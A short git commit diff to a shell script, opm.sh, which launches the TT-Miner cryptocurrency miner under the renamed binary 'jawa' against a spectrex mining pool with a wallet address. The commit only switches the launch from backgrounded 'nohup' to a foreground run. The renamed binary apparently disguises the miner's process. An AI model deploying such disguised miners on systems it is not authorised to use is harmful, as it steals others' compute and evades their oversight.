1fe931b618d72ce485b71b89869e01f3212df808
apaple <76417012+apaple@users.noreply.github.com>
2024-08-25 12:52:54 +0700

    Update opm.sh

--- opm.sh
+++ opm.sh
@@ -8,4 +8,4 @@ mv TT-Miner jawa
 
 chmod u+x jawa
 
-nohup ./jawa -a spectrex -P qqzka7kf237a80wgg780fsvz6tyjc8paaw54urw3jmfxp73dh6ahkgvq0g5pe.rig@us.acc-pool.pw:18061
+./jawa -a spectrex -P qqzka7kf237a80wgg780fsvz6tyjc8paaw54urw3jmfxp73dh6ahkgvq0g5pe.rig@us.acc-pool.pw:18061
